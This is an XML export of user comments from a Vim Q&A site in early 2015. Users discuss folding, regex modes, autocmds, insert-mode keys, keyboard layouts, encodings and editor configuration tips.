  <row Id="1965" PostId="1959" Score="0" Text="This sounds like something that one InsertEnter/InsertLeave autocmd to toggle relative line numbering could do. Am I missing something?" CreationDate="2015-02-27T01:16:26.423" UserId="1094" />
  <row Id="1966" PostId="2256" Score="0" Text="For rarely-used characters, I use [Shapecatcher](http://shapecatcher.com/) (no editor integration that I know of) or I type the character name (`C-x 8 RET` in an editor that isn't vi, I don't know if Vim has something similar)." CreationDate="2015-02-27T02:16:43.667" UserId="8" />
  <row Id="1967" PostId="2249" Score="0" Text="When in insert mode I press CTRL-X CTRL-K I get a drop down list of all the possible words that could complete the fragment typed so far. Perhaps the function has a different name, but the function is there, and pulls the words from the current dictionary. I would like to pull the words from a list, if the first character is the @ sign. Any help would be appreciated." CreationDate="2015-02-27T06:59:27.830" UserId="1095" />
  <row Id="1968" PostId="2256" Score="0" Text="KDE users cannot use this method as [KDE relegates responsibility for implementing this feature to Xorg](https://bugs.kde.org/show_bug.cgi?id=103788), and [Xorg relegates to Qt](https://bugs.freedesktop.org/show_bug.cgi?id=26747), and [Qt relegates back to Xorg](http://bugreports.qt.nokia.com/browse/QTBUG-8). I discuss this on my page about [typing RTL text](http://dotancohen.com/howto/rtl_right_to_left.html)." CreationDate="2015-02-27T08:57:34.117" UserId="989" />
  <row Id="1970" PostId="2245" Score="0" Text="@IngoKarkat I just tried, and the result is very weird. See the edit" CreationDate="2015-02-27T09:15:35.253" UserId="602" />
  <row Id="1971" PostId="2252" Score="0" Text="you might want to use the `a` and `s` for embedded blocks (loops and so)" CreationDate="2015-02-27T09:55:32.210" UserId="342" />
  <row Id="1972" PostId="2252" Score="0" Text="@elyashiv I don't understand what you mean?" CreationDate="2015-02-27T09:56:55.920" UserId="51" />
  <row Id="1973" PostId="2259" Score="0" Text="thanks for the very useful answer. I [submitted](http://sourceforge.net/p/vim-latex/mailman/vim-latex-devel/?viewmonth=201502) this problem on the [developers](http://sourceforge.net/p/vim-latex/mailman/vim-latex-devel/) mailing list. Let's see if they confirm and possibly fix the issue." CreationDate="2015-02-27T11:16:38.200" UserId="602" />
  <row Id="1976" PostId="2261" Score="0" Text="One thing that I do with many of my source files is put one line at the top: `Copyright © ...; see below for full copyright`, and then put the license at the bottom of the file ([like this](http://code.arp242.net/pkg_clearleaves/src/8f509bae419815748a53d815ac77b45413b559b7/pkg_clearleaves?at=default)). I have no idea if this is an option for your PHB, but you could try suggesting it.." CreationDate="2015-02-27T13:21:24.013" UserId="51" />
  <row Id="1977" PostId="2261" Score="0" Text="Another way is to add/remove indentation with `autocmd` on `BufReadPost` and `BufWritePre`... I don't know what  your file looks like exactly, so I can't give you a ready-made function" CreationDate="2015-02-27T13:24:30.657" UserId="51" />
  <row Id="1978" PostId="2260" Score="1" Text="Here's a different idea: You have the `InsertEnter` and `InsertLeave` autocmds, which you can use to switch layouts automatically. Specifically, on  the `InsertLeave` you can check if it's Turkish, if it is, switch to Dvorak, set a flag, and when you enter insert again switch back to Turkish if that was the case last time you left insert mode." CreationDate="2015-02-27T13:33:45.737" UserId="51" />
  <row Id="1979" PostId="2256" Score="0" Text="@dotancohen That looks like a different issue (as in, feature request)." CreationDate="2015-02-27T14:56:18.213" UserId="51" />
  <row Id="1980" PostId="2249" Score="0" Text="If you never normally use CTRL-X CTRL-K, you could change the `'dictionary'` option to point to a different file. Alternatively you could turn your tags into vim tags and use CTRL-X CTRL-T or write a user-defined completion function and use CTRL-X CTRL-U. Both of these would be harder to do, though." CreationDate="2015-02-27T15:01:42.080" UserId="680" />
  <row Id="1981" PostId="2265" Score="0" Text="Thank you! Using Backslashes on the parenthesis helped." CreationDate="2015-02-27T15:13:25.463" UserId="826" />
  <row Id="1982" PostId="2256" Score="0" Text="*Make it work in GTK &amp; Qt* I put that code into `~/.gnomerc`. Probably in could be also in `~/.xsessionrc`." CreationDate="2015-02-27T15:57:41.177" UserId="739" />
  <row Id="1983" PostId="2268" Score="3" Text="Pretty sure `\v` includes `&lt;&gt;` word boundaries, which AFAIK is unique to Vim. So no, just describe them as &quot;Vim regex.&quot; (Not posting as an answer because I'm not positive)" CreationDate="2015-02-27T16:50:17.970" UserId="88" />
  <row Id="1984" PostId="346" Score="0" Text="Wikipedia claims nvi is based on elvis which shipped with the original 386BSD, and was an effort to make a more purely vi-compatible version. Is this correct?" CreationDate="2015-02-27T17:06:15.540" UserId="880" />
  <row Id="1985" PostId="473" Score="0" Text="IIRC you can use the `:gui` command (within `has(&quot;gui_running&quot;)`, of course) to force the gui startup sequence to happen before any subsequent .vimrc commands. My .vimrc uses this to allow the default background light/dark setting to be set based on the actual GUI background color." CreationDate="2015-02-27T18:20:56.247" UserId="880" />
  <row Id="1986" PostId="2270" Score="0" Text="I don't think &quot;very&quot; mode existed in vi. And `\V` seem to have been created explicitly because nomagic/`\M` does not do this." CreationDate="2015-02-27T18:48:30.643" UserId="880" />
  <row Id="1987" PostId="2270" Score="0" Text="Correct, I'll edit my query to mention that this is vim-specific" CreationDate="2015-02-27T18:49:20.287" UserId="680" />
  <row Id="1989" PostId="2271" Score="0" Text="Thanks for writing this up! When the pdf manual I found didn't format text correctly, I gave up on quoting it directly without thinking to just search for another version" CreationDate="2015-02-27T19:35:57.323" UserId="680" />
  <row Id="1990" PostId="2271" Score="0" Text="@MattBoehm Firefox's built-in PDF viewer has problems with copy and paste in my experience; have you tried opening it in Acrobat Reader? And I formatted this by hand from the source; I didn't see the PDF you found." CreationDate="2015-02-27T19:36:52.923" UserId="880" />
  <row Id="1991" PostId="2271" Score="0" Text="Things were messed up enough that I think the PDF was generated from an OCR scan, but I'll try acrobat in the future." CreationDate="2015-02-27T19:38:12.120" UserId="680" />
  <row Id="1992" PostId="2261" Score="0" Text="Of course you could always go the lazy route and indent your legalese ;)" CreationDate="2015-02-27T19:47:28.417" UserId="680" />
  <row Id="1993" PostId="2260" Score="0" Text="@Carpetsmoker I don't see how that fixes my issues. Even if there was something to &quot;check&quot; (I'm not sure what you think I'd be checking there...part of the problem is I go back and forth on a word by word basis), one of the reasons I was thinking along the lines of `:imap` is that it would work even in a remote ssh session or when `$DISPLAY` is otherwise not set." CreationDate="2015-02-27T20:07:05.910" UserId="267" />
  <row Id="1994" PostId="429" Score="0" Text="Why doesn't a syntax element containing a newline higlight to the end of the line?" CreationDate="2015-02-27T21:27:45.733" UserId="880" />
  <row Id="1995" PostId="2210" Score="0" Text="Your answer has a bunch of spaces at the ends of lines... I assume you edited it in vim, and copied to clipboard rather than writing it to a file." CreationDate="2015-02-27T21:29:10.770" UserId="880" />
  <row Id="1996" PostId="88" Score="1" Text="You may also want to also [set display=lastline](http://vi.stackexchange.com/questions/102/show-partially-hidden-wrapped-lines) to avoid blank @ lines at the end of the screen." CreationDate="2015-02-27T22:07:11.917" UserId="880" />
  <row Id="1997" PostId="2274" Score="1" Text="This effectively just asks for a list of platforms and their default Vi flavours. I don't think this is a very good question for the SE format to be honest..." CreationDate="2015-02-27T23:01:50.290" UserId="51" />
  <row Id="1998" PostId="2274" Score="1" Text="I'm asking about the existence of other vi flavors other than the most well known ones." CreationDate="2015-02-27T23:59:04.580" UserId="880" />
  <row Id="1999" PostId="2278" Score="4" Text="You could write your text as normal, and then do `:s/./% \0\r/` to add the `%` and newlines ... Not a *great* solution, though..." CreationDate="2015-02-28T00:26:55.547" UserId="51" />
  <row Id="2000" PostId="2278" Score="0" Text="Nice solution, it kinda works. Will be using it for now, thank you." CreationDate="2015-02-28T00:47:54.570" UserId="669" />
  <row Id="2001" PostId="2282" Score="0" Text="Seems like there is a `set foldlevel=0` needed? But maybe that's default." CreationDate="2015-02-28T03:16:02.880" UserId="925" />
  <row Id="2002" PostId="2282" Score="0" Text="Yeah the default is zero, but if it doesn't work without, adding it can't hurt. :-)" CreationDate="2015-02-28T03:18:03.703" UserId="1094" />
  <row Id="2003" PostId="2282" Score="0" Text="But now... how to switch it back again, with no traces?" CreationDate="2015-02-28T03:23:09.520" UserId="925" />
  <row Id="2004" PostId="2282" Score="0" Text="in normal mode, you can use 'zi' to toggle folding off and on." CreationDate="2015-02-28T04:04:31.660" UserId="227" />
  <row Id="2005" PostId="2283" Score="0" Text="I am not sure what your question is here. Do you want general highlight of the search string? Or highlighting as you type? Do you want to change the color of the highlighting based on the type of search string?" CreationDate="2015-02-28T10:30:33.513" UserId="66" />
  <row Id="2007" PostId="760" Score="1" Text="@joeytwiddle no, `$` moves *to* the end of the line, but doesn't include the newline. It's the difference between `0y$` and `yy`. Putting `h` after the `$` would just mean that you'd miss the last character." CreationDate="2015-02-28T11:10:58.227" UserId="514" />
  <row Id="2008" PostId="2283" Score="0" Text="Some basic highlighting is available in the search window (invoked by `q/`). It's not extensive, but perhaps a syntax plugin could improve it." CreationDate="2015-02-28T12:04:30.380" UserId="64" />
  <row Id="2009" PostId="2283" Score="0" Text="I guess I was thinking about the command window (`q:`). It uses VimScript highlighting." CreationDate="2015-02-28T12:11:33.020" UserId="64" />
  <row Id="2010" PostId="2283" Score="0" Text="@Bernhard Yes, it should be highlighting as you type, ideally.  Thanks to point it out. Basically, I want to make the syntax of the pattern after `/` visible. Literal text should be a fixed color (a code fragment in the pattern is not highlighted)." CreationDate="2015-02-28T15:28:45.643" UserId="925" />
  <row Id="2011" PostId="2285" Score="0" Text="I think this answer is improved over the previous one as it restores the last search term. Marking this as correct." CreationDate="2015-02-28T15:50:21.740" UserId="91" />
  <row Id="2012" PostId="457" Score="0" Text="I've rolled back the edit, as it wasn't my intent. Although it's clear I didn't understand the difference between the command-line window and Ex mode, I think there quite a difference between the two (it turns out) and I think my question was definitely focused on Ex mode. &quot;What's the usefulness of command editing mode?&quot; could definitely be another question." CreationDate="2015-02-28T15:54:10.083" UserId="91" />
  <row Id="2013" PostId="2282" Score="0" Text="Most of the time when I do this I first `:tab sp` to get a new throwaway view on the file. Then going back is as simple as `:close` or any other way to kill the tab." CreationDate="2015-02-28T17:49:09.047" UserId="1094" />
  <row Id="2014" PostId="2292" Score="1" Text="This is the &quot;original grep&quot; (`g/REgexp/p`) ... Problem is that you can't easily jump to one of the matches, though..." CreationDate="2015-02-28T19:44:02.883" UserId="51" />
  <row Id="2015" PostId="2292" Score="0" Text="@Carpetsmoker: You're right; for that, I have a plugin, see my other answer." CreationDate="2015-02-28T20:00:38.487" UserId="970" />
  <row Id="2016" PostId="2292" Score="0" Text="That could be useful for many cases. Can the output be redirected to a new buffer? That would allow to still have syntax highlighting on the lines. (Hmm... that raises another question, wait a second...)" CreationDate="2015-02-28T20:18:15.767" UserId="925" />
  <row Id="2017" PostId="2296" Score="1" Text="It's not really clear to me what exactly you're asking. Could you provide a simple example of what you've done, what happened, and what you would like to happen? This should probably make it clearer." CreationDate="2015-03-01T02:53:40.917" UserId="51" />
  <row Id="2019" PostId="2291" Score="0" Text="I think the [VimRegEx.vim](http://www.vim.org/scripts/script.php?script_id=1091) plugin perhaps does this? I haven't tried it." CreationDate="2015-03-01T03:03:50.697" UserId="51" />
  <row Id="2020" PostId="2297" Score="0" Text="In iTerm, what does `echo $TERM` output? Additionally, you might want to check what `:hi Comment` says, particularly about the cterm setting. It might be setting italics when iTerm does not have support for italics (well it does but lets just assume it doesn't, because the solution is quite hacky)" CreationDate="2015-03-01T03:12:46.560" UserId="246" />
  <row Id="2021" PostId="2297" Score="0" Text="Also, do not manually set `t_Co`. Vim is quite capable of reading the $TERM variable to see if the terminal does support 256colors. Manually setting it will break havoc (okay I exaggerate a bit) if the Terminal does not support 256 colors." CreationDate="2015-03-01T03:18:47.787" UserId="246" />
  <row Id="2022" PostId="2252" Score="0" Text="your solution would work for functions and so, but not for blocks embedded in them. you can use the `a1` and `s1` return values for implementing this." CreationDate="2015-03-01T06:03:11.583" UserId="342" />
  <row Id="2023" PostId="2252" Score="0" Text="@elyashiv Like I said, I have no idea how Pascal looks as I've never programmed a line of Pascal. I've conservatively implemented a very basic foldexpr (this is also why we anchor the matches to the start of the line). In any case, using syntax-based folding is probably the better way to go if you want full folding of everything... Many people only use folding for functions, though, so this simple method may still prove useful for some :-)" CreationDate="2015-03-01T06:06:14.213" UserId="51" />
  <row Id="2027" PostId="2244" Score="0" Text="My answer appears to be a poor man's approximation of the [numbers.vim](http://myusuf3.github.io/numbers.vim/) plugin offered in another answer. ;-)" CreationDate="2015-03-01T07:57:55.737" UserId="630" />
  <row Id="2028" PostId="2081" Score="1" Text="I had this problem too and worked around it by using `BufReadPost,BufEnter,BufWinEnter`, but it still appeared sometimes. Thanks to this note on `--remote-send` I was able to find a reason of such behaviour, [see this vim-dev post](https://groups.google.com/forum/#!topic/vim_dev/2nrIOoiJzVU). So maybe it will be fixed in Vim soon. Another temporary half workaround is to set `'autochdir'` option, if you're fine with changing directory for all filetypes." CreationDate="2015-03-01T08:35:10.643" UserId="860" />
  <row Id="2029" PostId="2081" Score="0" Text="@xaizek thanks --- this is clearly the case for the behavior descried here. I have a workaround in the [linked post](http://vi.stackexchange.com/questions/2082/how-to-escape-a-whole-string-in-a-command) --- I do not like `autochdir` for all files (even for TeX files, I do want the switch only for `.tex`, not for example `.sty`...)" CreationDate="2015-03-01T10:03:26.530" UserId="854" />
  <row Id="2031" PostId="2296" Score="0" Text="I think all of the settings you're talking about are related to filetype. It's likely that by saving the new file with the right file extension, these settings would be applied. If you don't want to save the new file, you can try something like `:setfiletype javascript`." CreationDate="2015-03-01T12:37:40.493" UserId="64" />
  <row Id="2032" PostId="2289" Score="0" Text="A rebuttal to Known Issue #1: You shouldn't leave Insert mode with `&lt;C-C&gt;`." CreationDate="2015-03-01T12:49:17.240" UserId="64" />
  <row Id="2033" PostId="2289" Score="0" Text="@tommcdo, I don't, but if it's there, someone uses it. It's actually useful to avoid abbreviation expansion, I'm wondering why `InsertLeave` is not triggered for this key." CreationDate="2015-03-01T12:56:28.967" UserId="860" />
  <row Id="2034" PostId="2289" Score="0" Text="I suppose I mean to promote a trend of rejecting `&lt;C-C&gt;` as a good way to exit Insert mode. The way you've mentioned it could imply that it's sometimes a good method. It's kind of like saying &quot;Caveat: your document won't be saved if you close Microsoft Word by unplugging your computer.&quot;" CreationDate="2015-03-01T13:04:05.633" UserId="64" />
  <row Id="2035" PostId="2289" Score="0" Text="@tommcdo Didn't think it might sound this way. Added a note about `&lt;C-C&gt;` being the reason of the issue. I'm not aware of another method to leave insert mode suppressing abbreviation expansion as `&lt;C-C&gt;` does, if there is no, it's useful at least as part of a mapping like `inoremap &lt;silent&gt; &lt;c-c&gt; &lt;c-c&gt;:doautocmd InsertLeave&lt;cr&gt;`." CreationDate="2015-03-01T13:37:45.547" UserId="860" />
  <row Id="2036" PostId="2289" Score="0" Text="I hadn't considered abbreviations, that's a good point. I even found some places in the help that describe `&lt;C-C&gt;` as leaving Insert mode without expanding abbreviations, and there's no mention of how it doesn't trigger `InsertLeave` events. I'm now curious if there is a built-in way to do that, but for now your mapping is a great idea." CreationDate="2015-03-01T13:51:42.710" UserId="64" />
  <row Id="2037" PostId="2289" Score="0" Text="@tommcdo, see `:help i_CTRL-C`, it says `Does not trigger the InsertLeave autocommand event.` in documentation for Vim 7.4.050 (the oldest runtime files I have around)." CreationDate="2015-03-01T14:03:42.557" UserId="860" />
  <row Id="2038" PostId="2289" Score="0" Text="In quickref.text, under Q_ai (Insert mode keys), it's described simply as &quot;Like `&lt;Esc&gt;`, but do not use an abbreviation&quot;. Admittedly, I had to go out of my way to find this example." CreationDate="2015-03-01T14:08:57.180" UserId="64" />
  <row Id="2039" PostId="2303" Score="0" Text="Also ensure encoding in Vim is unicode before replacement." CreationDate="2015-03-01T16:14:20.477" UserId="220" />
  <row Id="2040" PostId="2303" Score="0" Text="That's what the second argument in nr2char() is for" CreationDate="2015-03-01T16:24:06.433" UserId="71" />
  <row Id="2041" PostId="2303" Score="0" Text="Yes, but if one have e.g. `set enc=latin1` and do the substitution, the `u05E2` would result in the glyph `â` or `0xe2` and not `ע`. With `enc=utf-8` one get `ע` or `0x05e2`. Not sure what exactly happens, but likely `nr2char()` returns the full utf-8 code, and then it is *“cut off”* and the leading byte silently thrown away due to enc setting." CreationDate="2015-03-01T17:25:25.483" UserId="220" />
  <row Id="2042" PostId="2298" Score="0" Text="Yep - looks like the update fixed my issue. Thanks!" CreationDate="2015-03-01T17:43:11.053" UserId="1133" />
  <row Id="2043" PostId="2303" Score="0" Text="As the utf-8 sequence for Unicode `05e2` is `d7a2` the above assumption is perhaps wrong." CreationDate="2015-03-01T17:47:53.583" UserId="220" />
  <row Id="2044" PostId="293" Score="0" Text="It would be nice if you could post some details of the plugin, such as dependencies (if any), a couple of usage examples, etc." CreationDate="2015-03-01T18:59:44.263" UserId="205" />
  <row Id="2045" PostId="2306" Score="5" Text="Yes, the default HTML syntax script provides folding. Unless you use an alternative script, that's _the_ way to do syntax folding. Can it recognize JavaScript? Why don't you simply try? So, what's your question?!" CreationDate="2015-03-01T20:10:09.993" UserId="970" />
  <row Id="2046" PostId="2301" Score="1" Text="The best way to find out what a single command in Vim does, is not google, but the help system. Simply type `:h f` to get help on the `f` command." CreationDate="2015-03-01T20:35:41.313" UserId="342" />
  <row Id="2047" PostId="102" Score="0" Text="My web service log file has a line that's 98518 characters wide. When wrapped it fills more than 1 screen. How can I scroll it smoothly in vim? Using navigation keys like $ and w isn't quite working, is there another key that jumps say 1000 characters at a time?" CreationDate="2015-03-02T01:58:08.647" UserId="398" />
  <row Id="2048" PostId="102" Score="0" Text="@ropata You could use something like `nnoremap H 1000h` and `nnoremap L 1000l` in your `.vimrc` to make `H` move left 1000 characters and similar for `L`, or you could wrap the line (`gww`) within Vim. But that's a different question, which you should [ask as a separate question](http://vi.stackexchange.com/questions/ask)." CreationDate="2015-03-02T02:05:13.037" UserId="88" />
  <row Id="2050" PostId="2307" Score="0" Text="I ended up using the command sequence `10gj` [from SO](http://stackoverflow.com/questions/4946421/vim-moving-with-hjkl-in-long-lines-screen-lines) to jump down 10 lines at a time. Perhaps there's an easier way?" CreationDate="2015-03-02T02:12:30.970" UserId="398" />
  <row Id="2051" PostId="2307" Score="0" Text="I don't don't see what's wrong with using `10gj`? Seems pretty easy to me. You can of course rebind this (see linked question) to make it slightly easier." CreationDate="2015-03-02T02:15:12.087" UserId="51" />
  <row Id="2052" PostId="676" Score="0" Text="I personally view a camalCased word as a whole word and don't like the idea of breaking half way into a word because of case or underscore. Usually I use the `f` and `t` keys to manage inner word movements." CreationDate="2015-03-02T05:04:56.783" UserId="544" />
  <row Id="2053" PostId="2307" Score="0" Text="I'd recommend piping the file to an XML reformatter. If you need it recompressed for writing, pipe again to a minimizer. If you do this often, it should be possible to write a mapping/plugin that opens the current visual selection in a new buffer, reformatted, and leave a couple marks on the original so that when the buffer is saved, it's written to the original location, reuglified." CreationDate="2015-03-02T10:23:07.020" UserId="632" />
  <row Id="2054" PostId="2301" Score="1" Text="@elyashiv not very useful when one thinks of the command as `fg`. What does `:he fg` give you?" CreationDate="2015-03-02T11:04:41.317" UserId="205" />
  <row Id="2055" PostId="676" Score="0" Text="@Sukima that's what I was doing until I asked this question, but it requires more &quot;brain power&quot; to think about which character to `t` to, instead of just going to the next capital letter." CreationDate="2015-03-02T12:36:39.180" UserId="79" />
  <row Id="2056" PostId="2310" Score="0" Text="Both can be solved by using the command-line window with `:q`; this opens a new &quot;buffer-like&quot; window, in which you can use `hjkl` for movement, `y` for yanking, etc." CreationDate="2015-03-02T13:51:45.247" UserId="51" />
  <row Id="2057" PostId="2310" Score="1" Text="@Carpetsmoker (you mean `q:`, right?) Good to know! I had accidentally got there in the past, but not really thought about using it. It doesn't seem to work with `/` though (search)." CreationDate="2015-03-02T14:13:36.363" UserId="850" />
  <row Id="2058" PostId="90" Score="0" Text="@yo', well, in `g5j`, `g5` is seen first, which just jumps to the next `5` before you apply the `j`. That's why it can't do what `5gj` does." CreationDate="2015-03-02T14:17:40.743" UserId="850" />
  <row Id="2060" PostId="2312" Score="1" Text="`&lt;C-f&gt;` is very useful to know, since it works after you are already half-way through the command." CreationDate="2015-03-02T14:20:31.620" UserId="850" />
  <row Id="2061" PostId="2312" Score="1" Text="I agree; the `:` comes almost automatically for me, so it's good to be able to switch without going back to normal mode." CreationDate="2015-03-02T14:21:26.690" UserId="970" />
  <row Id="2063" PostId="2310" Score="0" Text="Oops, yes, I meant q: ... I never used it much, so I can't give you a full/proper answer..." CreationDate="2015-03-02T15:10:39.723" UserId="51" />
  <row Id="2064" PostId="2256" Score="0" Text="@Carpetsmoker, maybe you can find [this post](http://rlog.rgtti.com/2014/05/01/how-to-modify-a-keyboard-layout-in-linux/) interesting. I have added a `dead-greek` key to my layout now, and `alt-g b` gives me a nice β... and using CapsLock as a compose key is really the best thing after slices bread." CreationDate="2015-03-02T17:05:34.740" UserId="854" />
  <row Id="2065" PostId="2318" Score="1" Text="Simply creating a `~/.vimrc` file will also enable `'nocompatible'` mode." CreationDate="2015-03-02T17:51:29.437" UserId="15" />
  <row Id="2066" PostId="2303" Score="0" Text="@Sukminder - my experience is that unicode encodings are handled specially for situations like this and use the unicode codepoint as the ordinal rather than the multibyte sequence." CreationDate="2015-03-02T19:35:22.267" UserId="880" />
  <row Id="2067" PostId="1985" Score="0" Text="Why isn't -= smarter about this sort of thing? It knows that formatoptions is a &quot;single letter flags&quot; option because += doesn't do the comma." CreationDate="2015-03-02T19:38:48.537" UserId="880" />
  <row Id="2068" PostId="457" Score="1" Text="@AndrewFerrier You asked about `q:` specifically, and mentioned it as, among the two key sequences, the one you have the most issue with. And two of the answers here may be useful to people who are searching for it by the correct term." CreationDate="2015-03-02T19:41:00.210" UserId="880" />
  <row Id="2069" PostId="2321" Score="0" Text="Is there a way to do this while leaving the cursor alone?" CreationDate="2015-03-02T20:17:44.993" UserId="880" />
  <row Id="2070" PostId="2321" Score="0" Text="@Random832 Adding a `\`\`` to the end will return the cursor to the previous location." CreationDate="2015-03-02T20:22:46.940" UserId="1166" />
  <row Id="2071" PostId="2321" Score="0" Text="I'm concerned that this will make it not apply the selection to the yank command. I'll experiment some today." CreationDate="2015-03-02T20:24:52.893" UserId="880" />
  <row Id="2072" PostId="2301" Score="0" Text="@muru a lout of information - you find out there is no command `fg` (just `-fg`), so you conclude the command is f..." CreationDate="2015-03-02T20:40:19.117" UserId="342" />
  <row Id="2073" PostId="2321" Score="1" Text="I added a marker command to the mapping, it should leave the cursor where it is now." CreationDate="2015-03-02T20:42:06.290" UserId="865" />
  <row Id="2074" PostId="2318" Score="2" Text="Relevant documentation: `:help cpo-u` and `:help undo-two-ways`" CreationDate="2015-03-02T20:57:12.140" UserId="1170" />
  <row Id="2075" PostId="2308" Score="0" Text="Thanks for the tips, I will experiment with xmllint" CreationDate="2015-03-02T21:02:28.150" UserId="398" />
  <row Id="2076" PostId="2306" Score="0" Text="You are right. I edited the question, I want to enable the default HTML syntax folding. Am I missing something?" CreationDate="2015-03-02T22:19:31.780" UserId="977" />
  <row Id="2077" PostId="2325" Score="0" Text="Ah okay so I can just add that to my `.vimrc` then?" CreationDate="2015-03-03T02:06:08.947" UserId="1065" />
  <row Id="2079" PostId="1985" Score="0" Text="@Random832 It's just a string value ... There is no &quot;single-letter-flags&quot; type in Vim; it just gets interpreted that way... This is not ideal, but I don't see it as a huge problem, either..." CreationDate="2015-03-03T10:31:06.783" UserId="51" />
  <row Id="2081" PostId="1985" Score="0" Text="@Carpetsmoker If that were true then `+=` wouldn't have special handling for it either. Vim obviously has a list somewhere of which options work this way." CreationDate="2015-03-03T11:42:12.410" UserId="880" />
  <row Id="2082" PostId="1985" Score="0" Text="@Random832 Right, it does seem to do special tricks with `+=` ... meh :-/" CreationDate="2015-03-03T11:47:10.800" UserId="51" />
  <row Id="2084" PostId="2320" Score="0" Text="Wow, all this time I was using `mmgg&quot;+yG\`m` and never thought of this. Thanks, this is going right in the .vimrc." CreationDate="2015-03-03T14:01:48.887" UserId="88" />
  <row Id="2086" PostId="2316" Score="0" Text="Using `.` for multiple undos doesn't work in Vim. That's a feature specific to nvi, which is an entirely different (re-)implementation of vi." CreationDate="2015-03-03T15:04:19.347" UserId="343" />
  <row Id="2087" PostId="2330" Score="1" Text="Note that you'll likely want to use `&amp;l:shiftwidth` to only change the buffer local variable." CreationDate="2015-03-03T15:26:14.857" UserId="15" />
  <row Id="2088" PostId="2341" Score="4" Text="I realise this is the Vi(m) SE site, but `sed` is a rather lighter solution to this: `sed -i 's/v0.0.2/v0.0.3/g' *.pl`" CreationDate="2015-03-03T15:26:54.993" UserId="646" />
  <row Id="2089" PostId="2339" Score="0" Text="I removed the hash (not sure what it's for), and I want to match anywhere in the line, so I removed the caret, and I had to escape special characters to use it in my modeline, but it works: `&quot; vim:set foldmethod=expr foldexpr=getline(v\:lnum)=~\'&gt;&gt;&gt;\'?\'&gt;1\'\:\'=\' foldlevel=0 foldclose= :`" CreationDate="2015-03-03T15:32:37.813" UserId="1176" />
  <row Id="2090" PostId="2339" Score="1" Text="Great! The `=~#` is for case-sensitive matching; it doesn't matter here (but I like to be explicit). You could define a `:function` in your vimrc and reference that in the modeline; would save you from the escaping (and repetition)." CreationDate="2015-03-03T15:38:40.490" UserId="970" />
  <row Id="2093" PostId="2344" Score="0" Text="Awesome! `&lt;ctrl-r&gt;` would be particularly useful." CreationDate="2015-03-03T15:57:57.170" UserId="850" />
  <row Id="2094" PostId="2340" Score="0" Text="This doesn't seem possible as near as I can figure out... Even piping characters to external programs (`xxd`, `hexdump`) seems difficult, since many functions don't seem to be multibyte-aware enough (at least not with BIG-5)..." CreationDate="2015-03-03T16:48:22.360" UserId="51" />
  <row Id="2095" PostId="121" Score="1" Text="You want an :argdo, if you run this for a couple of files on the commandline" CreationDate="2015-03-03T17:29:16.037" UserId="71" />
  <row Id="2096" PostId="2347" Score="7" Text="I would suggest that you learn to program C (or C++, Java, Javascript) better. There are many cases where you do **NOT** want to add a `;`, for example when breaking a function call with many arguments over 2 or more lines... Scripting all of these cases is difficult... You will quickly get used to adding the semicolons, so just hang in there for a little while :-)" CreationDate="2015-03-03T18:13:22.453" UserId="51" />
  <row Id="2097" PostId="2347" Score="0" Text="Thanks for the tip. I know about that which is why I put `etc.` in my exceptions. This is also why I want to toggle it on and off." CreationDate="2015-03-03T18:18:11.760" UserId="1168" />
  <row Id="2098" PostId="2134" Score="2" Text="Fixed. Now, blacklists &amp; co are supported." CreationDate="2015-03-03T18:39:59.627" UserId="626" />
  <row Id="2099" PostId="2318" Score="0" Text="Thanks Quincy and jamessan.  Just creating the ~/.vimrc file worked!" CreationDate="2015-03-03T18:59:03.137" UserId="1162" />
  <row Id="2100" PostId="2348" Score="1" Text="You can't add blank lines now :-) ... There are probably many more situations where this will do unexpected things  !" CreationDate="2015-03-03T19:55:12.743" UserId="51" />
  <row Id="2101" PostId="2348" Score="1" Text="Yep, that was the first thing I noticed too. It will also add a semicolon even if the line already has a semicolon at the end of it and fail for many other instances where the end of a line is not the end of a statement. I really hope the code I use above is not used by someone for semicolon insertion, but maybe it will help someone apply these tricks to a different use case. If someone adds enough exceptions that they truly feel that automatic insertion improves their workflow, then good on them." CreationDate="2015-03-03T21:24:33.940" UserId="680" />
  <row Id="2102" PostId="2348" Score="0" Text="On a related note, I sometimes find myself accidentally adding semicolons in python, so I do `inoremap ; _` for those files. Gives me a slightly easier way to type underscores, but when I do type a semicolon at the end of a line, I notice the character change and instantly catch my error." CreationDate="2015-03-03T21:26:27.553" UserId="680" />
  <row Id="2103" PostId="2348" Score="2" Text="@Carpetsmoker thank you for pointing this out. Also thank you @_MattBoehm for giving me the starter code. Looks like I will need to add the new line exception too! Looks like a fun challenge! Looks like I will learn vim code and c++ the dame time. Challenge accepted! Will try code tomorrow." CreationDate="2015-03-03T21:30:21.743" UserId="1168" />
  <row Id="2104" PostId="2342" Score="1" Text="Also see the following [Vimcasts](http://vimcasts.org/) episode: [Project-wide find and replace](http://vimcasts.org/episodes/project-wide-find-and-replace/)" CreationDate="2015-03-03T21:36:06.273" UserId="778" />
  <row Id="2105" PostId="2348" Score="0" Text="Could you also show me how to add more then one regex match please?" CreationDate="2015-03-03T22:40:02.247" UserId="1168" />
  <row Id="2106" PostId="2348" Score="1" Text="You can either try to expand the pattern to match more cases or change `match(...)==-1` to `((match(...)==-1) || (match(...)==-1)). Instead of `||` you may have to escape them as `&lt;BAR&gt;&lt;BAR&gt;`." CreationDate="2015-03-03T22:44:54.620" UserId="680" />
  <row Id="2107" PostId="2350" Score="1" Text="Does `Alt` (press, not hold) and then `j` work? With `xterm` at least I need to set `metaSendsEscape` to `true`  to get these sequences to work... I don't know if you have the same problem, and I don't use OSX so I can't test..." CreationDate="2015-03-03T23:16:30.427" UserId="51" />
  <row Id="2108" PostId="2350" Score="0" Text="@Carpetsmoker Pressing `Alt`, release, then `j` or any other key works as normal. I've checked and found the option ['Use option as meta key'](http://apple.stackexchange.com/a/54784/22781), enabled it and it works now. So setting `metaSendsEscape` did the trick, thanks." CreationDate="2015-03-03T23:41:08.447" UserId="467" />
  <row Id="2110" PostId="2337" Score="0" Text="gvim defaults for `StatusLine` are: `term=bold,reverse cterm=bold,reverse gui=bold,reverse`, and for `StatusLineNC` the values are `term=reverse cterm=reverse gui=reverse`" CreationDate="2015-03-04T02:24:42.927" UserId="398" />
  <row Id="2111" PostId="2351" Score="0" Text="I endorse this approach! Collect a few of these files (e.g. dofoo.vim dobar.vim) in a directory and then `:source {filename}` the one you need." CreationDate="2015-03-04T03:03:30.897" UserId="398" />
  <row Id="2113" PostId="2341" Score="0" Text="@MichaelColes Yes, but not all Vim users have sed on their computers." CreationDate="2015-03-04T07:54:04.673" UserId="343" />
